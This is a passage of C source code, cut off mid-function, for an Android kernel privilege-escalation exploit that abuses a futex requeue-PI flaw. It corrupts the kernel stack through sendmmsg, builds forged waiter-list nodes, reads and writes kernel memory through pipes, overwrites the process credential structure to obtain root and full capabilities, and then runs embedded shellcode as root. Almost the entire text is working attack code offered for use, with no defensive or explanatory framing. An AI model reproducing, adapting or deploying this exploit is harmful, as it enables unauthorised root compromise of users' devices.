#include <unistd.h>
#include <linux/futex.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <limits.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <pwd.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include "log.h"

struct mmsghdr {
    struct msghdr msg_hdr;
    unsigned int  msg_len;
};

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI   11
#endif

#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI   12
#endif

#define ERROR         0
#define ROOT_SUCCESS  1
#define FIX_SUCCESS   2
#define ALL_DONE      3

#define KERNEL_START  0xc0000000

unsigned char shellcode_buf[2048] = { 0x90, 0x90, 0x90, 0x90 };
unsigned char config_buf[2048] = { "c0nfig" };

int config_new_samsung = 0;
int config_iovstack = 2;
int config_offset = 0;
int config_force_remove = 0;

int run_shellcode_as_root() {

	int uid = getuid();
	if (uid != 0) {
		LOGV("Not uid=%d, returning\n", uid);
        return 0;
	}

	if (shellcode_buf[0] == 0x90) {
		LOGV("No shellcode, uid=%d\n", uid);
		return 0;
	}
	LOGV("running shellcode, uid=%d\n", uid);

	int pid = fork();
	LOGV("onload, pid=%d\n", pid);
	if (pid == 0) {
        LOGV("shellcode, pid=%d, tid=%d\n", getpid(), gettid());
		void *ptr = mmap(0, sizeof(shellcode_buf), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
		if (ptr == MAP_FAILED) {
			return 0;
		}
		memcpy(ptr, shellcode_buf, sizeof(shellcode_buf));
		void (*shellcode)() = (void(*)())ptr;
        shellcode();
	}
	LOGV("finished, pid=%d\n", pid);
    return pid;
}

#define DEV_PTMX "/dev/ptmx"
int PORT = 58295;

unsigned long addr, hacked_node, hacked_node_alt;
int HACKS_fdm = 0;
pid_t waiter_thread_tid;
pthread_mutex_t done_lock;
pthread_mutex_t done_kill_lock;
pthread_mutex_t thread_returned_lock;
pthread_cond_t done;
pthread_cond_t done_kill;
pthread_cond_t thread_returned;
pthread_mutex_t is_thread_desched_lock;
pthread_cond_t is_thread_desched;
pthread_mutex_t is_thread_awake_lock;
pthread_cond_t is_thread_awake;
int lock1 = 0;
int lock2 = 0;
pid_t last_tid = 0, leaker_pid = 0, stack_modifier_tid = 0, pid6 = 0, pid7 = 0;
pthread_mutex_t *is_kernel_writing;
int pipe_fd[2];
int sockfd;
pid_t tid_12 = 0;
pid_t tid_11 = 0;
unsigned long first_kstack_base, final_kstack_base, leaker_kstack_base, target_waiter;
unsigned long t11;
unsigned long lock;
char shell_server[256];
int loop_limit = 10;
pid_t remove_pid[1024];
unsigned long remove_waiter[1024];
int remove_counter = 0;

const char str_ffffffff[] = {0xff, 0xff, 0xff, 0xff, 0};
const char str_1[] = {1, 0, 0, 0, 0};

void reset_hacked_list(unsigned long hacked_node);

/*********************/
/*** PIPE STUFF ******/
/*********************/

// Pipe server
static int start_pipe_server() {
    int  nbytes,msg;
    int done_root = 0;

    /* Parent process closes up output side of pipe */
    close(pipe_fd[1]);
    LOGD("[CONTROLLER] Controller started with PID %d\n", getpid());

    while(1) {
        /* Read in a message from the exploiting process */
        nbytes = read(pipe_fd[0], &msg, sizeof(msg));
        if(nbytes <= 0) return 0;
        if(msg == ROOT_SUCCESS) {
            LOGD("[CONTROLLER] Exploit succeded\n");
            done_root = 1;
        }
        if(msg == FIX_SUCCESS) {
            LOGD("[CONTROLLER] Fix succeded\n");     
        }
        if(msg == ALL_DONE) {
            LOGD("[CONTROLLER] Exploit completed\n");
            if(done_root)
                return 1;
        }
        if(msg == ERROR) {
            if(done_root) {
                LOGD("[CONTROLLER] Error but exploit succeded\n");
                return 1;
            }
            else {
                LOGD("[CONTROLLER] Error received\n");
                return 0;
            }
        }
    }
}

// Send a message to the controller
static void send_pipe_msg(int msg) {
    int msg_to_send;

    msg_to_send = msg;
    write(pipe_fd[1], &msg, sizeof(msg)); 
}

// Read kernel space using pipe
ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
    int pipefd[2];
    ssize_t len;

    pipe(pipefd);

    len = write(pipefd[1], writebuf, count);

    if (len != count) {
        LOGD("[PIPE] FAILED READ @ %p : %d %d\n", writebuf, (int)len, errno);
        return -1;
    }

    read(pipefd[0], readbuf, count);
    LOGD("[PIPE] Read %d bytes\n", count);

    close(pipefd[0]);
    close(pipefd[1]);

    return len;
}

// Write in kernel space using pipe
ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
    int pipefd[2];
    ssize_t len;
    int ret = 0;

    pipe(pipefd);
    ret = write(pipefd[1], writebuf, count);
    len = read(pipefd[0], readbuf, count);
    if (len != count) {
        LOGD("[PIPE] FAILED WRITE @ %p : %d %d\n", readbuf, (int)len, errno);
        return -1;
    }
    else
        LOGD("[PIPE] Written %d bytes\n", (int)len);

    close(pipefd[0]);
    close(pipefd[1]);

    return len;
}



/*********************/
/**** SOCKET STUFF ***/
/*********************/

void *accept_socket(void *arg) {
    int yes;
    struct sockaddr_in addr = {0};
    int ret;
    int sock_buf_size;
    socklen_t optlen;

    sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
    if(sockfd < 0) {
        LOGD("[ACCEPT SOCKET] Socket creation failed\n");
        send_pipe_msg(ERROR);
        return NULL;
    }

    yes = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

    // We need set the socket kernel buffer as smaller as possible.
    // When we will use the sendmmsg syscall, we need to fill it to remain attached to the syscall

    sock_buf_size = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if(bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        LOGD("[ACCEPT SOCKET] Socket bind failed\n");
        send_pipe_msg(ERROR);
        return NULL;
    }

    if(listen(sockfd, 1) < 0) {
        LOGD("[ACCEPT SOCKET] Socket listen failed\n");
        send_pipe_msg(ERROR);
        return NULL;
    }

    while(1) {
        ret = accept(sockfd, NULL, NULL);
        if (ret < 0) {
            LOGD("[ACCEPT SOCKET] Socket accept failed\n");
            send_pipe_msg(ERROR);
            return NULL;
        } else {
            LOGD("[ACCEPT SOCKET] Client accepted!\n");
        }
    }

    return NULL;
}


int make_socket() {
    int sockfd;
    struct sockaddr_in addr = {0};
    int ret;
    int sock_buf_size;
    socklen_t optlen;

    sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
    if (sockfd < 0) {
        LOGD("[MAKE SOCKET] socket failed.\n");
        send_pipe_msg(ERROR);
        return 0;
    } else {
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    }

    while (1) {
        ret = connect(sockfd, (struct sockaddr *)&addr, 16);
        if (ret >= 0) {
            break;
        }
        usleep(10);
    }

    // We need set the socket kernel buffer as smaller as possible
    // When we will use the sendmmsg syscall, we need to fill it to remain attached to the syscall

    sock_buf_size = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

    return sockfd;
}


/*************************/
/**** KERNEL STUFF *******/
/*************************/  
void stop_for_error() {
    LOGD("[ERROR] Sleeping for error");
    send_pipe_msg(ERROR);
    while(1)
        sleep(10);
}

// Remove a pending waiter
void remove_remaining_waiter(int index) {
    unsigned long addr;
    unsigned long val[4];


    LOGD("[REMOVER] Killing tid %d waiter %x\n", remove_pid[index], (unsigned int) remove_waiter[index]);

    addr = (unsigned long)mmap((unsigned long *)0xbef000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

    reset_hacked_list(0xbeffe0);

    // Create a correct next and previous waiter

    *((unsigned long *)0xbf0004) = remove_waiter[index];      // (entry->next)->prev
    *((unsigned long *)0xbeffe0) = remove_waiter[index];      // (entry->prev)->next
    *((unsigned long *)0xbf000c) = (remove_waiter[index]+8);  // (entry->node_next)->node_prev
    *((unsigned long *)0xbeffe8) = (remove_waiter[index]+8);  // (entry->node_prev)->node_next

    val[0] = 0xbf0000;
    val[1] = 0xbeffe0;
    val[2] = 0xbf0008;
    val[3] = 0xbeffe8;
    write_pipe((void *)(remove_waiter[index]), &val, 16);

    // Now we can kill the waiter safely

    pthread_mutex_lock(&is_thread_awake_lock);
    kill(remove_pid[index], 14);
    pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
    pthread_mutex_unlock(&is_thread_awake_lock);

    munmap((unsigned long *)0xbef000, 0x2000);

}

// Fix the kernel waiter list
int fix_kernel_waiter_list(unsigned int head) {

    unsigned int val, val2, val3, list, prio6, prio3;
    int i, err = 0, ret = 0;
    unsigned long w[4];
    unsigned int as[12];

    LOGD("[FIXER] prio 6 at %x\n", head);

    list = head + 4;

    // Save the prio6 waiter
    read_pipe((void *) list, &prio6, 4);

    // Save the prio3 waiter
    read_pipe((void *) (list+4), &prio3, 4);

    // Fix prio3
    ret = write_pipe((void *) (prio3+4), &t11, 4);    // prio_list->prev   
    if(ret == -1)
        err = 1;

#ifdef DEBUG
    ////////////////  Just debug  //////////////////////////////
    read_pipe((void *) (list-4), &as, 48); 
    LOGD("[FIXER] First: %x %x %x %x %x %x %x %x %x %x %x %x\n",
            as[0], as[1], as[2], as[3], as[4], as[5], as[6], as[7], as[8], as[9], as[10], as[11]);
    //////////////////////////////////////////////
#endif


    // Find the first waiter before the hacked waiter. We need to fix it
    for(i = 0; i < 2; i++) {
        read_pipe((void *) list, &val, 4);
        list = val;
        if(i == 0) {
            // At the beginning we need to save the lock pointer
            read_pipe((void *) (list + 40), &lock, 4); 

#ifdef DEBUG
            ////////////////  Just debug  //////////////////////////////
            read_pipe((void *) (list-4), &as, 48); 
            LOGD("[FIXER] Second: %x %x %x %x %x %x %x %x %x %x %x %x\n",
                    as[0], as[1], as[2], as[3], as[4], as[5], as[6], as[7], as[8], as[9], as[10], as[11]);
            //////////////////////////////////////////////
#endif

        }
    }


    // Adjust the lock->next pointer
    LOGD("[FIXER] Looking for the lock next offset address\n");
    if(lock) {
        for(i = 0; i < 5; i++) {
            read_pipe((void *) (lock + (i * 4)), &val3, 4);
            if(val3 == (prio3 + 8)) {
                LOGD("[FIXER] Lock next offset fount at %d\n", (i * 4));
                lock = lock + (i * 4);
            }
        }	
    }

    // Fix the lock->prev. Now points to the hacked node. Change it to the prio 12 waiter
    val2 = t11 + 8;
    ret = write_pipe((void *) (lock + 4), &val2, 4); // lock->prev      
    if(ret == -1)
        err = 1;

    // Fix prio 7 waiter. It points to the hacked node. Update it pointing to the prio 11 waiter
    val2 = t11+8;
    ret = write_pipe((void *) (list), &t11, 4);       // prio_list->next
    if(ret == -1)
        err = 1;

    ret = write_pipe((void *) (list + 8), &val2, 4);  // node_list->next
    if(ret == -1)
        err = 1;


    // Fix prio 11. Points to the hacked node, fix it to point to the prio 7 waiter    
    w[0] = prio3;     // prio_list->next
    w[1] = list;      // prio_list->prev
    w[2] = lock;      // node_list->next
    w[3] = list + 8;  // node_list->prev

    ret = write_pipe((void *) t11, &w, 16);
    if(ret == -1)
        err = 1;

    LOGD("[FIXER] Lock->next found at %x\n", (unsigned int) lock);
    LOGD("[FIXER] All done!\n");

#ifdef DEBUG
    ///////////////////////////// DEBUG ////////////////////////////7
    read_pipe((void *) (prio3-4), &as, 48); 
    LOGD("[FIXER] prio3 %x: %x %x %x %x %x %x %x %x %x %x %x %x\n", (unsigned int)(prio3-4), 
            as[0], as[1], as[2], as[3], as[4], as[5], as[6], as[7], as[8], as[9], as[10], as[11]);

    read_pipe((void *) (head), &as, 48); 
    LOGD("[FIXER] prio4 %x: %x %x %x %x %x %x %x %x %x %x %x %x\n", (unsigned int)(head), 
            as[0], as[1], as[2], as[3], as[4], as[5], as[6], as[7], as[8], as[9], as[10], as[11]);

    read_pipe((void *) (prio6-4), &as, 48); 
    LOGD("[FIXER] prio6 %x: %x %x %x %x %x %x %x %x %x %x %x %x\n", (unsigned int)(prio6-4), 
            as[0], as[1], as[2], as[3], as[4], as[5], as[6], as[7], as[8], as[9], as[10], as[11]);

    read_pipe((void *) (list - 4), &as, 48); 
    LOGD("[FIXER] prio7 %x: %x %x %x %x %x %x %x %x %x %x %x %x\n", (unsigned int)(list-4), 
            as[0], as[1], as[2], as[3], as[4], as[5], as[6], as[7], as[8], as[9], as[10], as[11]);

    read_pipe((void *) (t11-4), &as, 48); 
    LOGD("[FIXER] prio11 %x: %x %x %x %x %x %x %x %x %x %x %x %x\n", (unsigned int)(t11-4), 
            as[0], as[1], as[2], as[3], as[4], as[5], as[6], as[7], as[8], as[9], as[10], as[11]);

    read_pipe((void *) (lock), &as, 16); 
    LOGD("LOCK: %x %x %x %x\n", as[0], as[1], as[2], as[3]);
    //////////////////////////////////////////////
#endif

    sleep(1);

    return err;

}



// Hack in the kernel
void hack_the_kernel(int signum) {
    char *slavename;
    int pipefd[2];
    char readbuf[0x100];
    unsigned long thread_info_dump[4];
    unsigned long task_struct_dump[0x200];
    unsigned long cred_struct_dump[0x40];
    unsigned long cred_struct_dump_orig[0x40];
    unsigned long group_info_struct_dump[6];
    unsigned long group_info_struct_dump_orig[6];
    pid_t pid;
    int i, ret;
    unsigned long val1, val2;
    int err = 0;

    leaker_pid = gettid();

    pthread_mutex_lock(&is_thread_awake_lock);
    pthread_cond_signal(&is_thread_awake);
    pthread_mutex_unlock(&is_thread_awake_lock);

    // Check if we are the first or the second evil thread
    if (final_kstack_base == 0) {
        LOGD("[FIRST KERNEL HACK] First evil thread started\n");

        pthread_mutex_lock(is_kernel_writing);
        // We need to use a pipe... Open a pts device to use it

        HACKS_fdm = open(DEV_PTMX, O_RDWR);
        unlockpt(HACKS_fdm);
        slavename = ptsname(HACKS_fdm);

        open(slavename, O_RDWR);
        LOGD("[FIRST KERNEL HACK] First evil thread going to wait\n");

        if(config_new_samsung) {
            pipe(pipefd);
            syscall(__NR_splice, HACKS_fdm, NULL, pipefd[1], NULL, sizeof readbuf, 0);

        }
        else {
            read(HACKS_fdm, readbuf, 0x100);
        }

        // Here the TRIGGER told us to continue the dirty job
        // Update the thread_info struct of the second evil thread using the pipe.

        write_pipe((void *)(final_kstack_base + 8), (void *)str_ffffffff, 4);

        LOGD("[FIRST KERNEL HACK] All Done!\n");

        // Tell the second thread that now can continue
        pthread_mutex_unlock(is_kernel_writing);

        // Add a waiter at the beginning of the list so we can leak it
        LOGD("[LEAKER] Adding waiter with prio 3 as leaker\n");
        setpriority(PRIO_PROCESS, 0, 4);
        LOGD("[LEAKER] PID %d TID %d\n", getpid(), gettid());

        syscall(__NR_futex, &lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

        // If we are here the stack modifier has been killed

        LOGD("[LEAKER] Leaker unlocked and exiting %d\n", gettid());

        // Tell to the second evil thread that it can fix the waiter list now
        pthread_mutex_lock(&done_kill_lock);
        pthread_cond_signal(&done_kill);
        pthread_mutex_unlock(&done_kill_lock);

        sleep(5);
        return;

    }

    //////////////////////////////////////////
    // From here we are the second evil thread
    LOGD("[SECOND KERNEL HACK] Waiting to be powered!\n");
    pthread_mutex_lock(is_kernel_writing);

    sleep(2);

    LOGD("[SECOND KERNEL HACK] Dumping thread_info...\n");
    read_pipe((void *)final_kstack_base, thread_info_dump, 0x10); // Read the thread_info struct...
    read_pipe((void *)(thread_info_dump[3]), task_struct_dump, 0x800); // end get the task_struct dump

    LOGD("[SECOND KERNEL HACK] task_struct at %x\n", (unsigned int) thread_info_dump[3]);

    val1 = 0;
    val2 = 0;
    pid = 0;

    LOGD("[SECOND KERNEL HACK] Parsing thread_info for cred...\n");
    // Parse the task_struct dump in order to find the cred struct pointer
    // If we have four succesive kernel pointer -> we have the cred struct
    for (i = 0; i < 0x200; i++) {
        if (task_struct_dump[i] == task_struct_dump[i + 1]) {
            if (task_struct_dump[i] > 0xc0000000) {
                if (task_struct_dump[i + 2] == task_struct_dump[i + 3]) {
                    if (task_struct_dump[i + 2] > 0xc0000000) {
                        if (task_struct_dump[i + 4] == task_struct_dump[i + 5]) {
                            if (task_struct_dump[i + 4] > 0xc0000000) {
                                if (task_struct_dump[i + 6] == task_struct_dump[i + 7]) {
                                    if (task_struct_dump[i + 6] > 0xc0000000) {
                                        val1 = task_struct_dump[i + 7]; // Found offset for the cred struct
                                        LOGD("[SECOND KERNEL HACK] %x %d: cred struct pointer FOUND!\n", (unsigned int) val1, (i+7));
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if(!val1) {
        LOGD("[SECOND KERNEL HACK] cred pointer NOT FOUND. Aborting...\n");
        stop_for_error();
    }

    LOGD("[SECOND KERNEL HACK] reading cred struct for group_info\n");
    // Update the cred struct
    read_pipe((void *)val1, cred_struct_dump, 0x100);
    memcpy((void *)cred_struct_dump_orig, (void *)cred_struct_dump, 0x100); // Save the original struct

    val2 = cred_struct_dump[0x16]; // group_info struct
    if (val2 > 0xc0000000) {
        if (val2 < 0xffff0000) {
            read_pipe((void *)val2, group_info_struct_dump, 0x18); // group_info struct dump
            memcpy((void *)group_info_struct_dump_orig, (void *)group_info_struct_dump, 0x18);
            if (group_info_struct_dump[0] != 0) {
                if (group_info_struct_dump[1] != 0) {
                    if (group_info_struct_dump[2] == 0) {
                        if (group_info_struct_dump[3] == 0) {
                            if (group_info_struct_dump[4] == 0) {
                                if (group_info_struct_dump[5] == 0) {
                                    group_info_struct_dump[0] = 1; // atomic_t usage
                                    group_info_struct_dump[1] = 1; // int ngroups

                                    // Update the group_info struct in the kernel
                                    LOGD("[SECOND KERNEL HACK] Updating group_info struct...\n");
                                    write_pipe((void *)val2, group_info_struct_dump, 0x18);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Update the cred struct 
    cred_struct_dump[1] = 0;             // uid
    cred_struct_dump[2] = 0;             // gid
    cred_struct_dump[3] = 0;             // suid
    cred_struct_dump[4] = 0;             // sgid
    cred_struct_dump[5] = 0;             // euid
    cred_struct_dump[6] = 0;             // egid
    cred_struct_dump[7] = 0;             // fsuid
    cred_struct_dump[8] = 0;             // fsgid

    cred_struct_dump[10] = 0xffffffff;   // cap_inheritable
    cred_struct_dump[11] = 0xffffffff;   // cap_permitted
    cred_struct_dump[12] = 0xffffffff;   // cap_effective
    cred_struct_dump[13] = 0xffffffff;   // cap_bset
    cred_struct_dump[14] = 0xffffffff;   // jit_keyring
    cred_struct_dump[15] = 0xffffffff;   // *session_keyring
    cred_struct_dump[16] = 0xffffffff;   // *process_keyring
    cred_struct_dump[17] = 0xffffffff;   // *thread_keyring;


    LOGD("[SECOND KERNEL HACK] Updating cred struct in the kernel...\n");

    // Update the cred struct in the kernel
    write_pipe((void *)val1, cred_struct_dump, 0x48);

    sleep(2);

    pid = syscall(__NR_gettid);

    // Update the pid
    LOGD("[SECOND KERNEL HACK] Looking for PID..\n");
    i = 0;
    while (1) {
        if (task_struct_dump[i] == pid) {
            LOGD("[SECOND KERNEL HACK] PID found. Update and hack....\n");

            write_pipe((void *)(thread_info_dump[3] + (i << 2)), (void *)str_1, 4);

            if (getuid() != 0) {
                LOGD("[SECOND KERNEL HACK] Something wrong. Root failed. Aborting...\n");
                send_pipe_msg(ERROR);
            } else {
                LOGD("[SECOND KERNEL HACK] Root process succeded!!!\n");

                //////////// ROOT CODE HERE /////////////////

                // Fork and install the root shell
                if(fork() == 0) {
                    LOGD("running as pid %d, tid %d, with uid %d", getpid(), gettid(), getuid());
                    run_shellcode_as_root();
                    exit(0);
                }

                //////////////////////////////////////////////
                sleep(3);
                close(sockfd);
                send_pipe_msg(ROOT_SUCCESS);
                break;
            }
        }
        i++;
    }

    // Fix cred_struct and group_info_struct with originals
    //sleep(3); // be sure nothing is happening before to fix
    LOGD("[SECOND KERNEL HACK] Fixing cred struct\n");
    write_pipe((void *)val1, cred_struct_dump_orig, 0x48);
    sleep(2);
    LOGD("[SECOND KERNEL HACK] Fixing group info\n");
    write_pipe((void *)val2, group_info_struct_dump_orig, 0x18);
    sleep(2);

    // To fix the waiter list we need to know where is the beginning of the list (we hacked it).
    // To do that we use the leaker thread that has a waiter with prio 3

    LOGD("[SECOND KERNEL HACK] I have %x as thread_info leaker!!!\n", (unsigned int) leaker_kstack_base);
    LOGD("[SECOND KERNEL HACK] Dumping thread_info...\n");
    read_pipe((void *)leaker_kstack_base, thread_info_dump, 0x10); // Read the thread_info struct...
    read_pipe((void *)(thread_info_dump[3]), task_struct_dump, 0x800); // end get the task_struct dump

    LOGD("[SECOND KERNEL HACK] leaker task_struct at %x\n", (unsigned int) thread_info_dump[3]);

    int k = 0;
    val1 = 0;
    val2 = 0;
    pid = 0;

    // Find the waiter in the task struct. We know is a bit after the cred_struct

    LOGD("[SECOND KERNEL HACK] Parsing leaker thread_info for cred...\n");
    // Parse the task_struct dump in order to find the cred struct pointer
    // If we have four succesive kernel pointer -> we have the cred struct

    for (i = 0; i < 0x200; i++) {
        if (task_struct_dump[i] == task_struct_dump[i + 1]) {
            if (task_struct_dump[i] > 0xc0000000) {
                if (task_struct_dump[i + 2] == task_struct_dump[i + 3]) {
                    if (task_struct_dump[i + 2] > 0xc0000000) {
                        if (task_struct_dump[i + 4] == task_struct_dump[i + 5]) {
                            if (task_struct_dump[i + 4] > 0xc0000000) {
                                if (task_struct_dump[i + 6] == task_struct_dump[i + 7]) {
                                    if (task_struct_dump[i + 6] > 0xc0000000) {
                                        LOGD("[SECOND KERNEL HACK] We are at cred\n");

                                        // We need to find the waiter in the task_struct
                                        
                                        for(k = 0; k<100; k++) {
                                            if(task_struct_dump[k + i] > 0xc0000000 && task_struct_dump[k + i] != 0xffffffff) {
                                                read_pipe((void *) task_struct_dump[k + i], &val1, 4);
                                                // Check a pointer pointing to 0x7b (123 = prio 3)
                                                //if(val1 == 0x7b) {
                                                if(val1 == 0x7c) {
                                                    target_waiter = (unsigned int) task_struct_dump[k + i];
                                                    LOGD("Found target_waiter %d %x\n", k + i, (unsigned int) target_waiter);
                                                    sleep(2);
                                                    break;
                                                }
                                            }
                                        }
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }  

    if(!target_waiter)
        stop_for_error();

    // Get the next node, so the prio 6 node
    LOGD("[SECOND KERNEL HACK] Waiting the thread\n");

    pthread_mutex_lock(&done_kill_lock);

    // Ok now we need to remove
    int h;
    for(h = 0; h < remove_counter; h++)
        remove_remaining_waiter(h);

    if(fix_kernel_waiter_list(target_waiter) == 0)
        send_pipe_msg(FIX_SUCCESS);
    else
        stop_for_error();


    LOGD("[SECOND KERNEL HACK] Waiter list fixed\n");

    // Kill the stack modifier
    kill(stack_modifier_tid,14);

    // Wait for the prio 4 node going out
    pthread_cond_wait(&done_kill, &done_kill_lock);

    LOGD("[SECOND KERNEL HACK] Prio 4 exiting, going to fix the waiter list\n");

    // We fixed everything, so we can leave now
    pthread_exit(NULL);

}


/***************************/
/**** THREAD FOR WAITERS ***/
/***************************/

void thread_killer(int signum) {

    LOGD("[KILLER] Thread with pid %d and tid %d is going to exit\n", getpid(), gettid());

    pthread_mutex_lock(&is_thread_awake_lock);
    pthread_cond_signal(&is_thread_awake);
    pthread_mutex_unlock(&is_thread_awake_lock);

    pthread_exit(NULL);

}


// Add a new waiter in the list with a specific prio.
void *make_action_adding_waiter(void *arg) {
    int prio;
    struct sigaction act;
    struct sigaction act3;
    int ret;

    prio = (int)arg;
    last_tid = syscall(__NR_gettid);

    pthread_mutex_lock(&is_thread_desched_lock);
    pthread_cond_signal(&is_thread_desched);

    // Handler to hack in the kernel.
    act.sa_handler = hack_the_kernel;
    sigemptyset(&act.sa_mask);
    act.sa_flags = 0;
    act.sa_restorer = NULL;
    sigaction(12, &act, NULL);

    // Handler to kill useless threads.
    act3.sa_handler = thread_killer;
    sigemptyset(&act3.sa_mask);
    act3.sa_flags = 0;
    act3.sa_restorer = NULL;
    sigaction(14, &act3, NULL);

    setpriority(PRIO_PROCESS, 0, prio);

    pthread_mutex_unlock(&is_thread_desched_lock);

    LOGD("[MAKE ACTION] Adding lock with prio %d and tid %d\n", prio, gettid());
    ret = syscall(__NR_futex, &lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    LOGD("[MAKE ACTION] Lock with prio %d and tid %d returned\n", prio, gettid());

    // The firs node that will exit. Kill some other thread
    if(prio == 11) {
        LOGD("[MAKE ACTION] Killing prio 11\n");

        pthread_mutex_lock(&is_thread_awake_lock);
        kill(tid_11, 14);
        pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
        pthread_mutex_unlock(&is_thread_awake_lock);

        LOGD("[MAKE ACTION] Killing prio 7\n");

        pthread_mutex_lock(&is_thread_awake_lock);
        kill(pid7, 14);
        pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
        pthread_mutex_unlock(&is_thread_awake_lock);    

        LOGD("[MAKE ACTION] All done!\n");
        sleep(1);

        pthread_exit(NULL); 

    }

    // Last node will exit
    if(prio == 6) {
        LOGD("[MAKE ACTION] Prio 6 node is exiting\n");

        // Notify the main that we finished
        pthread_mutex_lock(&done_lock);
        pthread_cond_signal(&done);
        pthread_mutex_unlock(&done_lock);

        pthread_exit(NULL);
    }

    // Never reached
    return NULL;
}



// Create a new thread to add a new waiter with a prio
pid_t wake_actionthread(int prio) {
    pthread_t th4;
    pid_t pid;

    LOGD("[WAKE_ACTIONTHREAD] Starting actionthread\n");

    // Create the thread that will add a new lock.

    pthread_mutex_lock(&is_thread_desched_lock);
    pthread_create(&th4, 0, make_action_adding_waiter, (void *)prio);
    pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);

    LOGD("[WAKE_ACTIONTHREAD] Continuing actionthread\n");

    pid = last_tid;

    // Needed to be sure that the new thread is waiting to acquire the lock
    sleep(1);

    pthread_mutex_unlock(&is_thread_desched_lock);

    // Return the new thread created
    return pid;
}



// This is the first evil thread.
// When the vuln is triggered will use a syscall to modify the kernel stack.
void *stack_modifier(void *name)
{

    pthread_t l8;
    int sockfd, ret;
    struct mmsghdr msgvec[1];
    struct iovec msg_iov[8];
    unsigned long databuf[0x20];
    int i;
    char line[20];
    struct sigaction act3;

    stack_modifier_tid = gettid();

    LOGD("[STACK MODIFIER] Modifier started with tid %d\n", gettid());

    setpriority(PRIO_PROCESS , 0, 12);

    // Register an handle for a signal. We will use it to kill this thread later.
    act3.sa_handler = thread_killer;
    sigemptyset(&act3.sa_mask);
    act3.sa_flags = 0;
    act3.sa_restorer = NULL;
    sigaction(14, &act3, NULL);


    for (i = 0; i < 0x20; i++) {
        databuf[i] = hacked_node;
    }

    for (i = 0; i <= 8; i++) {
        msg_iov[i].iov_base = (void *)hacked_node;
        msg_iov[i].iov_len = 0x80;
    }

    //msg_iov[IOVSTACK_TARGET] will be our new waiter.
    // iov_len must be large enough to fill the socket kernel buffer to avoid the sendmmsg to return.

    msg_iov[config_iovstack].iov_base = (void *)hacked_node;
    msg_iov[config_iovstack].iov_len = hacked_node_alt;

    // The new waiter will be something like that:
    // prio = hacket_node
    // prio_list->next = hacked_node_alt
    // prio_list->prev = hacket_node
    // node_list->next = 0x7d
    // node_list->prev = hacked_node

    // hacked_node will be somethin < 0 so a negative priority

    msgvec[0].msg_hdr.msg_name = databuf;
    msgvec[0].msg_hdr.msg_namelen = 0x80;
    msgvec[0].msg_hdr.msg_iov = msg_iov;
    msgvec[0].msg_hdr.msg_iovlen = 8;
    msgvec[0].msg_hdr.msg_control = databuf;
    msgvec[0].msg_hdr.msg_controllen = 0x20;
    msgvec[0].msg_hdr.msg_flags = 0;
    msgvec[0].msg_len = 0;

    sockfd = make_socket();
    if (sockfd == 0) {
        return NULL;
    }

    LOGD("[STACK MODIFIER] Going in WAIT_REQUEUE\n");

    // Lets wait on lock1 to be requeued
    syscall(__NR_futex, &lock1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &lock2, 0);

    // Ok, at this point the vulnerability shoud be triggered.
    // We can modify the waiters list in the kernel.

    LOGD("[STACK MODIFIER] Exiting from WAIT_REQUEUE\n");
    LOGD("[STACK MODIFIER] I'm going to modify the kernel stack\n");

    // Use now a syscall deep to modify the waiter list.
    // sendmmsg -> sendmesg -> verify_iovec
    // verify_iovec will fille the iovstack structure of sendmesg and we know that
    // iovstack[IOVSTACK_TARGET] is at the same address of the waiter we can manipulate

    while (1) {
        ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
        if (ret <= 0) {
            LOGD("[STACK MODIFIER] Sendmmsg Error\n");
            send_pipe_msg(ERROR);
        }
        LOGD("[STACK MODIFIER] Done\n");
        break;
    }
    LOGD("[STACK MODIFIER] Leaving\n");

    return NULL;
}


void create_hacked_list(unsigned long hacked_node, unsigned long hacked_node_alt) {

    *((unsigned long *)(hacked_node_alt - 4)) = 0x81;                   // prio (120 + 9)
    *((unsigned long *) hacked_node_alt) = hacked_node_alt + 0x20;      // prio_list->next
    *((unsigned long *)(hacked_node_alt + 8)) = hacked_node_alt + 0x28; // node_list->next

    *((unsigned long *)(hacked_node_alt + 0x1c)) = 0x85;                // prio (120 + 13)
    *((unsigned long *)(hacked_node_alt + 0x24)) = hacked_node_alt;     // prio_list->prev
    *((unsigned long *)(hacked_node_alt + 0x2c)) = hacked_node_alt + 8; // node_list->prev

